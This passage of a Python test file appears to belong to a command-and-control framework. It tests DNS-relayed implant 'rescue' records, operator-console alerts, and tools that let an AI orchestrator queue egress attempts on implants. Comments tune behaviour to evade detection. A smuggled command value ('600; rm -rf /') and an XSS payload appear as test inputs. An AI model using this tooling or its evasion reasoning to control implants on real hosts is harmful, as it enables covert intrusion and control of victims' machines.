        self.app = server_mod.create_app(self.crypto, "operator-token",
                                         pathlib_Path(tmp.name))
        server_mod.agents.clear()
        del server_mod.unattributed_rescues[:]
        self.addCleanup(server_mod.agents.clear)
        self.addCleanup(lambda: server_mod.unattributed_rescues.clear())
        self.agent = "clumsy-raccoon"
        self.implant = "3948e54c95459fd4"
        server_mod.agents[self.agent] = {
            "id": self.implant, "hostname": "h", "last_seen": "now",
            "caps": [],
        }

    def _deliver(self, stamped_with):
        raw = dns_rescue.pack(
            {"https": (dns_rescue.CLASSES["timed_out"], 0),
             "dns": (dns_rescue.CLASSES["answered"], 0)},
            dns_rescue.FLAG_DNS_ANSWERED,
            dns_rescue.fingerprint(stamped_with))
        wrapped = self.crypto.wrap(
            {dns_rescue.WRAPPER_KEY: base64.b64encode(raw).decode()})
        with self.app.test_request_context("/api/v1/beacon", json=wrapped):
            return self.server_mod._handle_rescue(
                self.crypto.unwrap(wrapped) or {}, self.crypto)

    def test_a_rescue_stamped_with_the_implant_id_reaches_its_agent(self):
        self._deliver(self.implant)
        stuck = self.server_mod.agents[self.agent].get("stuck")
        self.assertIsNotNone(
            stuck, "the server holds this implant id in info['id'] and "
                   "still could not place the diagnosis")
        self.assertEqual(stuck["https"], ["timed_out", 0])

    def test_it_is_not_also_filed_as_unattributable(self):
        # Both would be worse than neither: the operator would see a claim
        # that nobody owns this record next to the record on its own row.
        self._deliver(self.implant)
        self.assertEqual(self.server_mod.unattributed_rescues, [])

    def test_the_agents_last_channel_says_dns(self):
        # The same bookkeeping a fleet-name match does. A rescue only ever
        # arrives over the DNS relay.
        self._deliver(self.implant)
        self.assertEqual(
            self.server_mod.agents[self.agent].get("last_channel"), "dns")

    def test_a_fleet_name_still_matches(self):
        self._deliver(self.agent)
        self.assertIsNotNone(self.server_mod.agents[self.agent].get("stuck"))

    def test_an_id_matching_neither_is_still_unattributable(self):
        self._deliver("a-host-that-never-registered")
        self.assertIsNone(self.server_mod.agents[self.agent].get("stuck"))
        self.assertEqual(len(self.server_mod.unattributed_rescues), 1)

    def test_a_record_with_no_implant_id_does_not_swallow_the_fingerprint(self):
        # `fingerprint("")` is a fixed value, so an agent record carrying no
        # id would match every rescue a beacon sent before it knew who it
        # was -- and the first such record in the dict would claim all of
        # them. An empty id identifies nobody.
        self.server_mod.agents["nameless-raccoon"] = {
            "id": "", "hostname": "", "last_seen": "now", "caps": [],
        }
        self._deliver("")
        self.assertIsNone(
            self.server_mod.agents["nameless-raccoon"].get("stuck"))
        self.assertEqual(len(self.server_mod.unattributed_rescues), 1)

    def test_the_fleet_name_wins_when_two_records_could_claim_it(self):
        # Two bytes of fingerprint collide once in 65536, and adding a
        # second candidate per agent doubles the chance. When both kinds
        # match, the fleet name is the stronger signal: the beacon only
        # stamps one if the server told it that name.
        other = "tidy-raccoon"
        self.server_mod.agents[other] = {
            "id": self.agent, "hostname": "h2", "last_seen": "now",
            "caps": [],
        }
        self._deliver(self.agent)
        self.assertIsNotNone(self.server_mod.agents[self.agent].get("stuck"))
        self.assertIsNone(self.server_mod.agents[other].get("stuck"))


class TestTheTwoGuisDoNotShareHelpers(unittest.TestCase):
    """The operator page may not call a helper only the agent page has.

    This repository serves two separate front ends: the operator console
    is one big string inside server.py, and the agent console is
    static/agent.js. They have escapers that do the same job under
    different names -- `esc` and `escHtml` -- and nothing stops a line
    moving between them. When one does, the symptom is not a visible
    error: the whole render throws, and a panel silently does not
    appear. That is how `escHtml(info.stuck.summary)` shipped.

    Today this finds exactly one name and nothing else, so it costs no
    maintenance to keep honest.
    """

    def _names(self, code):
        import re

        found = set(re.findall(r"function\s+([A-Za-z_$][\w$]*)", code))
        found |= set(re.findall(r"(?:const|let|var)\s+([A-Za-z_$][\w$]*)",
                                code))
        return found

    def test_no_agent_only_helper_is_called_from_the_operator_console(self):
        import re

        operator = _operator_script()
        agent = _strip_js_literals(
            pathlib_Path("software/c2/static/agent.js").read_text())

        called = set(re.findall(r"(?<![.\w$])([A-Za-z_$][\w$]*)\s*\(",
                                operator))
        leaked = sorted((called & self._names(agent))
                        - self._names(operator) - _JS_KEYWORDS)
        self.assertEqual(leaked, [],
                         "the operator console calls %s, which only the "
                         "agent console defines -- the render will throw "
                         "and the panel will not appear" % leaked)


_JS_KEYWORDS = frozenset({
    "if", "for", "while", "switch", "catch", "return", "function", "var",
    "let", "const", "new", "typeof", "in", "of", "do", "else", "async",
    "await", "delete", "void", "instanceof", "throw", "yield", "class",
    "super", "this", "case", "break", "continue", "try", "finally",
})


class TestWhatTheOperatorSees(unittest.TestCase):
    """Source-level, because the repo has no JS harness. Stated, not implied."""
    def setUp(self):
        self.src = pathlib_Path("software/c2/server.py").read_text()

    def test_the_via_dns_tag_no_longer_claims_nothing_is_reported(self):
        self.assertNotIn(
            "That channel carries tasking only: a task is delivered once "
            "and its result is never reported.", self.src)
        self.assertIn("why it is stuck", self.src)

    def test_the_diagnosis_is_rendered_as_an_advisory_not_an_error(self):
        # `ai-warns` is the yellow advisory class the OpSec notes use. A
        # working configuration that happens to be stuck must not render
        # as a failure.
        i = self.src.index("info.stuck ?")
        block = self.src[i:i + 400]
        self.assertIn("ai-warns", block)
        self.assertNotIn("Unavailable", block)

    def test_the_summary_is_escaped_with_a_helper_that_exists(self):
        # The first version of this test asserted `escHtml(...)` -- the
        # spelling I had invented. It passed, and the panel threw
        # "escHtml is not defined" in the browser, so an agent with a
        # stuck record rendered no detail panel at all. escHtml is real,
        # but it belongs to the *agent* GUI in static/agent.js; the
        # operator HTML calls its escaper `esc`. Checking a string
        # against itself is not a check: this asserts the escaper is
        # applied AND that the name is defined where it is called.
        import re

        i = self.src.index("info.stuck ?")
        block = self.src[i:i + 400]
        called = re.search(r"\b([A-Za-z_$][\w$]*)\(info\.stuck\.summary\)",
                           block)
        self.assertIsNotNone(called, "the summary is interpolated raw")
        name = called.group(1)
        # assertTrue, not assertRegex: the latter echoes the haystack, and
        # the haystack here is 200 kB of operator console.
        defined = re.search(
            r"function\s+%s\s*\(|(?:const|let|var)\s+%s\s*="
            % (re.escape(name), re.escape(name)), _operator_script())
        self.assertTrue(
            defined,
            "the operator GUI calls %s() on a record a target sent, and "
            "does not define it -- the panel will throw and not render"
            % name)

    def test_a_dead_resolver_is_called_out(self):
        i = self.src.index("info.stuck ?")
        self.assertIn("nothing can leave", self.src[i:i + 400])


_RESCUE_ROUTE = "/api/rescues/unattributed"


def _the_function_that_polls_rescues():
    """(name, source) of the operator-console function that asks the route.

    Found by what it does -- it is the one function that requests the
    route -- not by a name chosen here, so a rename cannot make the
    tests below vacuous and they never assert their own spelling.
    """
    import re

    from software.c2 import server as server_mod

    html = server_mod._OPERATOR_HTML
    if _RESCUE_ROUTE not in html:
        raise AssertionError("the operator console never asks for %s, so "
                             "nothing tells the operator" % _RESCUE_ROUTE)
    at = html.index(_RESCUE_ROUTE)
    starts = list(re.finditer(r"(?:async\s+)?function\s+([A-Za-z_$][\w$]*)"
                              r"\s*\([^)]*\)\s*\{", html[:at]))
    start = starts[-1]
    depth, i = 1, start.end()
    while depth:
        depth += {"{": 1, "}": -1}.get(html[i], 0)
        i += 1
    return start.group(1), html[start.start():i]


class TestTheOperatorIsToldAboutRescuesNobodyCanClaim(unittest.TestCase):
    """The drawer is a place you have to open; the console should speak up.

    Source-level for what can be read off the page (that the name called
    is defined where it is called -- the defect this feature already
    shipped once), and run under node for what cannot (that a record is
    announced once, not on every tick).
    """

    def test_the_poll_is_started_beside_the_agent_poll(self):
        import re

        from software.c2 import server as server_mod

        name, _ = _the_function_that_polls_rescues()
        html = server_mod._OPERATOR_HTML
        self.assertRegex(html, r"setInterval\(%s\s*,\s*\d+\)" % re.escape(name))
        self.assertRegex(html, r"setInterval\(refreshAgents\s*,\s*\d+\)")

    def test_the_notification_escapes_with_a_helper_that_exists(self):
        # The rule this feature's worst defect earned: escHtml(...) was an
        # invented spelling, the operator console calls its escaper `esc`,
        # and the whole agent panel threw and rendered nothing. So: every
        # function the poll calls must be one this page defines.
        import re

        _, source = _the_function_that_polls_rescues()
        code = _strip_js_literals(source)
        called = set(re.findall(r"(?<![.\w$])([A-Za-z_$][\w$]*)\s*\(", code))
        called -= _JS_KEYWORDS
        called.discard(_the_function_that_polls_rescues()[0])
        defined = TestTheTwoGuisDoNotShareHelpers()._names(_operator_script())
        undefined = sorted(called - defined)
        self.assertEqual(
            undefined, [],
            "the rescue poll calls %s, which the operator console does not "
            "define -- the poll will throw" % undefined)
        # And it must actually escape the one field a target influences.
        self.assertTrue(
            re.search(r"\b(?:%s)\(\s*\w+\.summary\s*\)"
                      % "|".join(map(re.escape, sorted(called))), code),
            "the summary is not passed through any function")

    def _run(self, polls):
        """Run the real poll under node against scripted responses.

        `polls` is a list of what the route answers on successive ticks.
        The page's own `esc` is lifted out of the page, so a name the poll
        calls that the page lacks throws here as it would in the browser.
        """
        import re

        from software.c2 import server as server_mod

        name, source = _the_function_that_polls_rescues()
        esc = re.search(r"function esc\(s\)\{.*?\n\}\n",
                        server_mod._OPERATOR_HTML, re.S).group(0)
        # The page-level `let` the poll keeps its memory in: whichever
        # declaration in the page the poll's own source mentions.
        state = "".join(
            d.group(0) + "\n" for d in re.finditer(
                r"^let\s+([A-Za-z_$][\w$]*)\s*=\s*[{\[][}\]];",
                server_mod._OPERATOR_HTML, re.M)
            if re.search(r"\b%s\b" % re.escape(d.group(1)), source))
        self.assertTrue(state, "the poll keeps no memory of what it has told")
        script = """
const toasts = [];
const seen_paths = [];
const polls = %s;
let tick = 0;
function storedToken(){ return "t"; }
function toast(type, title, msg, duration){ toasts.push({type, title, msg}); }
async function api(path){ seen_paths.push(path); return polls[tick++]; }
%s
%s
%s
(async () => {
  const counts = [];
  for(let i = 0; i < polls.length; i++){ await %s(); counts.push(toasts.length); }
  console.log(JSON.stringify({counts, toasts, seen_paths}));
})().catch(e => { console.error(e.stack); process.exit(1); });
""" % (json.dumps(polls), state, esc, source, name)
        done = subprocess.run(["node", "-e", script], capture_output=True,
                              text=True, timeout=30)
        self.assertEqual(done.returncode, 0, done.stderr)
        return json.loads(done.stdout)

    @staticmethod
    def _rec(fingerprint=1234, at="2026-01-01T00:00:00Z",
             summary="HTTPS: wanted authentication (407)"):
        return {"summary": summary, "dns_answered": True,
                "fingerprint": fingerprint, "at": at,
                "https": ["auth_required", 407]}

    def _unattributed(self, *records):
        return {"unattributed": list(records)}

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_a_record_is_announced_once_with_a_warning(self):
        got = self._run([self._unattributed(self._rec())])
        self.assertEqual(got["seen_paths"], [_RESCUE_ROUTE])
        self.assertEqual(len(got["toasts"]), 1)
        self.assertEqual(got["toasts"][0]["type"], "warning")
        self.assertIn("407", got["toasts"][0]["msg"])
        self.assertIn("%04x" % 1234, got["toasts"][0]["msg"])

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_a_record_already_seen_raises_no_second_notification(self):
        # The list is capped at 50 and never cleared, so a poll that
        # announces everything it is given re-fires every record on every
        # tick. One record three times, then one new record at the front.
        old = self._rec(fingerprint=1, at="2026-01-01T00:00:01Z")
        new = self._rec(fingerprint=3, at="2026-01-01T00:00:02Z")
        same = self._unattributed(old)
        got = self._run([same, same, same, self._unattributed(new, old)])
        self.assertEqual(got["counts"], [1, 1, 1, 2])

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_two_records_are_told_apart_by_beacon_and_by_time(self):
        # The key is per record: the same beacon stuck again later is news,
        # and two beacons stuck in the same second are two beacons.
        a = self._rec(fingerprint=7, at="2026-01-01T00:00:00Z")
        later = self._rec(fingerprint=7, at="2026-01-01T00:00:09Z")
        other = self._rec(fingerprint=8, at="2026-01-01T00:00:09Z")
        got = self._run([self._unattributed(a),
                         self._unattributed(later, a),
                         self._unattributed(other, later, a)])
        self.assertEqual(got["counts"], [1, 2, 3])

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_several_unseen_records_in_one_poll_raise_one_notification(self):
        # One rule, not a special case for the first load: a console opened
        # on a server that has been up for a week meets up to 50 records at
        # once, and so does a burst. toast() shows the element and files it
        # in the panel in one call, so there is no per-record route into the
        # panel without new plumbing; one notification says how many.
        records = [self._rec(fingerprint=n, at="2026-01-01T00:00:%02dZ" % n,
                             summary="leg %d is stuck" % n)
                   for n in (9, 8, 7, 6, 5)]
        got = self._run([self._unattributed(*records)])
        self.assertEqual(len(got["toasts"]), 1, got["toasts"])
        note = got["toasts"][0]
        self.assertEqual(note["type"], "warning")
        text = note["title"] + " " + note["msg"]
        self.assertIn(str(len(records)), text)
        self.assertRegex(text, r"(?i)match no agent|nobody can claim|unclaim")
        # It counts them; it does not pretend to name them.
        for n in range(5, 10):
            self.assertNotIn("leg %d" % n, text)
            self.assertNotIn("%04x" % n, text)

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_a_batch_is_not_announced_again_one_by_one(self):
        # Records folded into a batch are still *seen*: the next tick must
        # not re-raise them singly, and a later arrival is announced alone.
        batch = [self._rec(fingerprint=n, at="2026-01-01T00:00:%02dZ" % n)
                 for n in (3, 2, 1)]
        later = self._rec(fingerprint=4, at="2026-01-01T00:00:04Z")
        got = self._run([self._unattributed(*batch),
                         self._unattributed(*batch),
                         self._unattributed(later, *batch)])
        self.assertEqual(got["counts"], [1, 1, 2])
        self.assertIn("%04x" % 4, got["toasts"][1]["msg"])

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_what_a_target_sent_is_escaped_in_the_notification(self):
        got = self._run([self._unattributed(
            self._rec(summary="<img src=x onerror=alert(1)>"))])
        msg = got["toasts"][0]["msg"]
        self.assertNotIn("<img", msg)
        self.assertIn("&lt;img", msg)

    @unittest.skipUnless(shutil.which("node"), "node is not installed")
    def test_no_records_raises_nothing(self):
        got = self._run([{"unattributed": []}])
        self.assertEqual(got["toasts"], [])


# ── The agent reads it (Task 6) ──


class _StuckC2:
    """Just enough C2 for the tool: a fleet and a task queue."""

    def __init__(self, agents, unattributed=()):
        self._agents = agents
        self._unattributed = list(unattributed)
        self.queued = []

    async def list_agents(self):
        return list(self._agents.values())

    async def unattributed_rescues(self):
        return list(self._unattributed)

    async def get_agent(self, agent_id):
        return self._agents.get(agent_id)

    async def queue_task(self, agent_id, cmd, args="", data="",
                         timeout=300, lane="agent"):
        # The real signature. The first version of the egress tool passed
        # the whole attempt as `cmd`, which matches no verb the implant
        # dispatches, and a stub taking `command` hid that completely.
        self.queued.append({"agent": agent_id, "cmd": cmd, "args": args,
                            "data": data, "lane": lane})
        return "t1"


def _stuck_agent(**over):
    agent = {
        "id": "b1", "hostname": "host-1", "last_channel": "dns",
        "stuck": {
            "summary": "HTTPS: wanted authentication (407); DNS: answered; "
                       "SMB: unreachable; QUIC: timed out. a proxy was found.",
            "dns_answered": True, "fingerprint": 4242, "at": "now",
            "https": ["auth_required", 407], "dns": ["answered", 0],
            "smb": ["unreachable", 0], "quic": ["timed_out", 0],
        },
    }
    agent.update(over)
    return agent


def _orchestrator_tool(c2, name):
    import asyncio as _asyncio

    from software.agent.tools import registry

    tools = registry.orchestrator_tools(
        None, 1, dispatch_single=None, dispatch_parallel=None,
        tier="full", scope_key="k", c2=c2)
    for tool in tools:
        if tool.spec.name == name:
            return lambda **kw: _asyncio.run(tool.fn(**kw))
    raise AssertionError("no tool %r; got %s"
                         % (name, [t.spec.name for t in tools]))


class TestTheAgentReadsTheDiagnosis(unittest.TestCase):
    def _tool(self, c2, name):
        return _orchestrator_tool(c2, name)

    def test_it_reports_the_diagnosis_for_a_stuck_beacon(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        got = self._tool(c2, "get_stuck_beacons")()
        self.assertEqual(len(got["stuck"]), 1)
        self.assertIn("407", got["stuck"][0]["summary"])
        self.assertEqual(got["stuck"][0]["beacon_id"], "b1")

    def test_the_leg_report_names_every_transport_in_the_record(self):
        # The dict the campaign model reads to pick its next attempt. It
        # was written out as `("https", "dns", "smb", "quic")` for the
        # whole of the gsocket leg's life, so a beacon stuck with
        # `binary_missing` or `carrier_failed` handed the model four keys
        # with no mention of the leg that had failed -- the class survived
        # only inside the `summary` string, which nothing parses.
        #
        # Pinned against `dns_rescue.TRANSPORTS` rather than against a
        # list written here, because a list written here is the second
        # copy that made this possible. A sixth transport now fails this
        # test until the tool reports it.
        c2 = _StuckC2({"b1": _stuck_agent(
            stuck=dict(_stuck_agent()["stuck"],
                       gsocket=["carrier_failed", 0]))})
        entry = self._tool(c2, "get_stuck_beacons")()["stuck"][0]
        self.assertEqual(set(entry["legs"]), set(dns_rescue.TRANSPORTS),
                         "the leg report's key set is not the record's "
                         "transports; a leg that failed is invisible to the "
                         "model that has to choose the next attempt")
        self.assertEqual(entry["legs"]["gsocket"], ["carrier_failed", 0],
                         "the gsocket diagnosis is dropped from the report")

    def test_a_fleet_with_nothing_stuck_is_not_an_error(self):
        # Most beacons are fine and have nothing to report.
        c2 = _StuckC2({"b1": _stuck_agent(stuck=None)})
        got = self._tool(c2, "get_stuck_beacons")()
        self.assertEqual(got["stuck"], [])
        self.assertNotIn("error", got)

    def test_it_says_when_nothing_can_leave(self):
        agent = _stuck_agent()
        agent["stuck"]["dns_answered"] = False
        c2 = _StuckC2({"b1": agent})
        got = self._tool(c2, "get_stuck_beacons")()
        self.assertFalse(got["stuck"][0]["dns_answered"])

    def test_it_queues_exactly_one_next_attempt(self):
        # One candidate per call. A sweep of twelve is the loud thing the
        # design refused when it ruled out approach C.
        c2 = _StuckC2({"b1": _stuck_agent()})
        out = self._tool(c2, "try_egress")(beacon_id="b1", attempt="sleep",
                                           value="600")
        self.assertEqual(len(c2.queued), 1)
        self.assertEqual(c2.queued[0]["agent"], "b1")
        self.assertNotIn("error", out)

    def test_every_attempt_names_a_verb_the_implant_dispatches(self):
        # The first version of this tool emitted "proxy ..." and
        # "transport ...", neither of which the implant has. It queued
        # work that could never run, and nothing failed.
        import re

        from software.agent.tools import egress

        src = pathlib_Path("software/c2/beacon.py").read_text()
        dispatched = set(re.findall(r'elif cmd == "([a-z_0-9]+)"', src))
        dispatched.update(re.findall(r'if cmd == "([a-z_0-9]+)"', src))
        for verb in egress.ATTEMPT_VERBS.values():
            with self.subTest(verb=verb):
                self.assertIn(verb, dispatched,
                              "try_egress can emit cmd %r, which the beacon "
                              "does not dispatch" % verb)

    def test_sleep_goes_out_as_the_implants_own_verb(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        self._tool(c2, "try_egress")(beacon_id="b1", attempt="sleep",
                                     value="600")
        self.assertEqual(c2.queued[0]["cmd"], "sleep")
        self.assertEqual(c2.queued[0]["args"], "600")

    def test_a_profile_swap_goes_out_as_reconfig(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        self._tool(c2, "try_egress")(beacon_id="b1", attempt="profile",
                                     value='{"c2_profile": {"useragent": "x"}}')
        self.assertEqual(c2.queued[0]["cmd"], "reconfig")
        self.assertIn("useragent", c2.queued[0]["data"])

    def test_an_unknown_attempt_is_refused_with_the_list(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        out = self._tool(c2, "try_egress")(beacon_id="b1", attempt="proxy",
                                           value="http://x")
        self.assertIn("error", out)
        self.assertEqual(c2.queued, [])

    def test_a_profile_value_that_is_not_json_is_refused(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        out = self._tool(c2, "try_egress")(beacon_id="b1", attempt="profile",
                                           value="not json")
        self.assertIn("error", out)
        self.assertEqual(c2.queued, [])

    def test_a_sleep_value_that_is_not_a_number_is_refused(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        out = self._tool(c2, "try_egress")(beacon_id="b1", attempt="sleep",
                                           value="600; rm -rf /")
        self.assertIn("error", out)
        self.assertEqual(c2.queued, [])

    def test_it_refuses_a_beacon_that_is_not_stuck(self):
        # Changing the transport of a beacon that is fine is a way to lose
        # a working channel.
        c2 = _StuckC2({"b1": _stuck_agent(stuck=None)})
        out = self._tool(c2, "try_egress")(beacon_id="b1", attempt="sleep",
                                           value="600")
        self.assertIn("error", out)
        self.assertEqual(c2.queued, [])

    def test_it_refuses_an_unknown_beacon(self):
        c2 = _StuckC2({"b1": _stuck_agent()})
        out = self._tool(c2, "try_egress")(beacon_id="nope", attempt="sleep",
                                           value="600")
        self.assertIn("error", out)
        self.assertEqual(c2.queued, [])

    def test_the_tools_are_offered_to_the_orchestrator_only(self):
        from software.agent.tools import registry

        names = {s.name for s in registry.specs("executor", (), "full")}
        self.assertNotIn("get_stuck_beacons", names)
        self.assertNotIn("try_egress", names)

    def test_they_are_absent_without_a_c2(self):
        # Every other orchestrator tool must keep working when no C2 is
        # passed, which is what every existing caller does today.
        from software.agent.tools import registry

        tools = registry.orchestrator_tools(
            None, 1, dispatch_single=None, dispatch_parallel=None,
            tier="full", scope_key="k")
        names = {t.spec.name for t in tools}
        self.assertNotIn("get_stuck_beacons", names)
        self.assertIn("log_score", names)


def _unattributed_record(**over):
    record = {
        "summary": "HTTPS: unreachable; DNS: answered; SMB: unreachable; "
                   "QUIC: timed out.",
        "dns_answered": True, "fingerprint": 4242, "at": "now",
        "https": ["unreachable", 0], "dns": ["answered", 0],
        "smb": ["unreachable", 0], "quic": ["timed_out", 0],
    }
    record.update(over)
    return record


class TestTheAgentReadsRescuesNobodyCanClaim(unittest.TestCase):
    """Rescues from a beacon that never registered, so there is no id."""

    def _tool(self, c2, name):
        return _orchestrator_tool(c2, name)

    def test_the_tool_reports_unattributed_rescues_under_their_own_key(self):
        # Separate from "stuck" on purpose: there is no beacon id to task, so
        # a model must not be able to mistake one for something it can act on.
        c2 = _StuckC2({"b1": _stuck_agent()},
                      unattributed=[_unattributed_record()])
        got = self._tool(c2, "get_stuck_beacons")()
        self.assertEqual(len(got["stuck"]), 1)
        self.assertEqual(len(got["unattributed"]), 1)
        self.assertEqual(got["stuck"][0]["beacon_id"], "b1")
        self.assertIn("unreachable", got["unattributed"][0]["summary"])
        self.assertTrue(got["unattributed"][0]["dns_answered"])
        self.assertEqual(got["unattributed"][0]["legs"]["quic"],
                         ["timed_out", 0])

    def test_unattributed_entries_are_never_mixed_into_stuck(self):
        c2 = _StuckC2({}, unattributed=[_unattributed_record()])
        got = self._tool(c2, "get_stuck_beacons")()
        self.assertEqual(got["stuck"], [])
        self.assertEqual(len(got["unattributed"]), 1)

    def test_an_unattributed_entry_carries_no_beacon_id_field(self):
        # A field named like an id invites queueing work against it.
        c2 = _StuckC2({}, unattributed=[_unattributed_record()])
        entry = self._tool(c2, "get_stuck_beacons")()["unattributed"][0]
        for key in entry:
            with self.subTest(key=key):
                self.assertNotIn("id", key.lower().split("_"))
        self.assertNotIn("hostname", entry)

    def test_no_unattributed_rescues_is_an_empty_list(self):
        got = self._tool(_StuckC2({}), "get_stuck_beacons")()
        self.assertEqual(got["unattributed"], [])

    def _tool_over_the_real_client(self, status):
        # The real client against a server that answers `status` for the
        # route, so the failure is the one the client itself raises.
        import types

        from software.agent import c2client

        class Session:
            def request(self, method, url, **kw):
                if url.endswith("/api/agents"):
                    body = [_stuck_agent()]
                    return types.SimpleNamespace(
                        status_code=200, json=lambda: body)
                return types.SimpleNamespace(
                    status_code=status, json=lambda: {})

        client = c2client.C2Client("http://127.0.0.1:8099", "tok",
                                   session=Session())
        return self._tool(client, "get_stuck_beacons")

    def test_the_tool_still_works_against_a_server_without_the_route_405(self):
        # An older team server answers 405, not 404: its catch-all
        # /<path:path> accepts only POST, so a GET to an unrouted path is a
        # method error. The client treats only 404 as "missing", so this
        # arrives as a C2Unavailable and the tool has to absorb it.
        got = self._tool_over_the_real_client(405)()
        self.assertEqual(len(got["stuck"]), 1)
        self.assertNotIn("unattributed", got)
        self.assertNotIn("error", got)

    def test_the_tool_still_works_against_a_server_without_the_route_404(self):
        got = self._tool_over_the_real_client(404)()
        self.assertEqual(len(got["stuck"]), 1)
        self.assertNotIn("unattributed", got)

    def test_the_tool_still_works_when_the_route_fails_outright(self):
        got = self._tool_over_the_real_client(500)()
        self.assertEqual(len(got["stuck"]), 1)
        self.assertNotIn("unattributed", got)

    def test_a_failed_fetch_omits_the_key_rather_than_emptying_it(self):
        # Present and empty means "I asked, there are none"; absent means
        # "I could not ask". Emptying it would make the two the same.
        asked = self._tool(_StuckC2({}), "get_stuck_beacons")()
        self.assertEqual(asked["unattributed"], [])
        could_not = self._tool_over_the_real_client(405)()
        self.assertNotIn("unattributed", could_not)

    def test_a_rejected_token_on_that_route_also_omits_the_key(self):
        from software.agent import c2client

        class Rejected(_StuckC2):
            async def unattributed_rescues(self):
                raise c2client.C2Unauthorized("no")

        got = self._tool(Rejected({"b1": _stuck_agent()}),
                         "get_stuck_beacons")()
        self.assertEqual(len(got["stuck"]), 1)
        self.assertNotIn("unattributed", got)

    def test_a_programming_error_in_that_call_is_not_swallowed(self):
        # Only the client's own failures degrade. Anything else is a bug
        # and must surface, not read as "no unattributed rescues".
        class Buggy(_StuckC2):
            async def unattributed_rescues(self):
                raise KeyError("a bug")

        with self.assertRaises(KeyError):
            self._tool(Buggy({}), "get_stuck_beacons")()

    def test_an_entry_carries_the_fingerprint_as_the_server_logs_it(self):
        c2 = _StuckC2({}, unattributed=[_unattributed_record(fingerprint=0xBEE)])
        entry = self._tool(c2, "get_stuck_beacons")()["unattributed"][0]
        self.assertEqual(entry["fingerprint"], "0bee")

    def test_repeats_from_one_beacon_share_a_fingerprint(self):
        c2 = _StuckC2({}, unattributed=[
            _unattributed_record(fingerprint=7, at="t1"),
            _unattributed_record(fingerprint=7, at="t2"),
            _unattributed_record(fingerprint=9, at="t3")])
        got = self._tool(c2, "get_stuck_beacons")()["unattributed"]
        self.assertEqual([e["fingerprint"] for e in got],
                         ["0007", "0007", "0009"])

    def test_a_fingerprint_that_is_not_two_bytes_is_not_passed_through(self):
        # Whatever the server sent, only a two-byte number is rendered.
        for bad in ("<script>", -1, 0x10000, None, True, 1.5):
            with self.subTest(bad=bad):
                c2 = _StuckC2({}, unattributed=[
                    _unattributed_record(fingerprint=bad)])
                entry = self._tool(c2, "get_stuck_beacons")()[
                    "unattributed"][0]
                self.assertEqual(entry["fingerprint"], "")

    def test_the_stuck_list_is_not_swallowed_with_it(self):
        # Only the unattributed fetch degrades. A failing fleet listing is
        # still a failure of the whole call.
        from software.agent import c2client

        class Broken(_StuckC2):
            async def list_agents(self):
                raise c2client.C2Unavailable("down")

        with self.assertRaises(c2client.C2Unavailable):
            self._tool(Broken({}), "get_stuck_beacons")()

    def test_the_tool_description_says_they_cannot_be_tasked(self):
        from software.agent.tools import egress

        spec = next(e.spec for e in egress.entries()
                    if e.spec.name == "get_stuck_beacons")
        text = spec.description.lower()
        self.assertIn("unattributed", text)
        self.assertIn("no id", text)
        self.assertIn("cannot be tasked", text)

    def test_the_description_explains_an_absent_key(self):
        # The model cannot infer that convention; the description is the
        # only place it reads.
        from software.agent.tools import egress

        spec = next(e.spec for e in egress.entries()
                    if e.spec.name == "get_stuck_beacons")
        text = " ".join(spec.description.lower().split())
        self.assertIn("key is absent the server could not be asked", text)
        self.assertIn("present and empty means it was asked and there are "
                      "none", text)
        self.assertIn("same `fingerprint`", text)


class TestTheClientAsksForUnattributedRescues(unittest.IsolatedAsyncioTestCase):
    def _client(self, status=200, payload=None):
        import types

        from software.agent import c2client

        calls = []

        class Session:
            def request(self, method, url, **kw):
                calls.append((method, url))
                return types.SimpleNamespace(
                    status_code=status, json=lambda: payload)

        return (c2client.C2Client("http://127.0.0.1:8099", "tok",
                                  session=Session()), calls)

    async def test_it_returns_the_records_from_the_route(self):
        client, calls = self._client(
            payload={"unattributed": [_unattributed_record()]})
        got = await client.unattributed_rescues()
        self.assertEqual(got, [_unattributed_record()])
        self.assertEqual(calls, [
            ("GET", "http://127.0.0.1:8099/api/rescues/unattributed")])

    async def test_a_missing_route_is_an_error_not_an_empty_list(self):
        # "Could not ask" must not read as "asked, none": 404 and the 405
        # an older team server gives both raise. (405 also stays an error
        # in `_request` generally; allow_missing is not widened.)
        from software.agent import c2client

        for status in (404, 405):
            with self.subTest(status=status):
                client, _ = self._client(status=status)
                with self.assertRaises(c2client.C2Unavailable):
                    await client.unattributed_rescues()

    async def test_an_answer_without_the_list_is_rejected(self):
        from software.agent import c2client

        for payload in ([], {"oops": 1}, {"unattributed": "no"}):
            with self.subTest(payload=payload):
                client, _ = self._client(payload=payload)
                with self.assertRaises(c2client.C2Unavailable):
                    await client.unattributed_rescues()


class TestTheOrchestratorOffersThem(unittest.TestCase):
    """A tool built and never offered is a tool that does not exist."""

    def test_the_orchestrator_passes_its_c2_to_the_tool_registry(self):
        import inspect

        from software.agent import orchestrator

        src = inspect.getsource(orchestrator)
        i = src.index("registry.orchestrator_tools(")
        call = src[i:i + 400]
        self.assertIn("c2=", call,
                      "orchestrator_tools is called without a c2, so the "
                      "egress tools are filtered out and never offered")


class TestOnlyAnUpstreamLegReArmsTheLatch(unittest.TestCase):
    """The final review's finding, and the sharpest one on this branch.

    Excluding the rescue's own reply was not enough. The agent answers a
    rescue by queueing one attempt; that attempt is DELIVERED OVER DNS,
    which is a leg returning tasking, which re-armed the latch -- so the
    next dead cycle sent another rescue. Measured before the fix: six
    queries in twelve cycles, one every other cycle. That is a periodic
    pattern, which is precisely what the anti-goal forbids, because
    detection keys on rate and volume.

    Receiving over DNS proves nothing about egress: that channel is
    receive-only. Only HTTPS, SMB or QUIC delivering proves the way out is
    open again.
    """

    def _run(self, beacon, cycles, answer_each_rescue=True):
        cycle = {"n": 0}
        rescues = []
        pending = {"task": False}
        task = beacon._encrypt({"cmd": "proxy http://10.0.0.9:3128"})

        def query(name, qtype, server, timeout=10, status=None,
                  source=""):
            if status is not None:
                status["rcode"] = 0
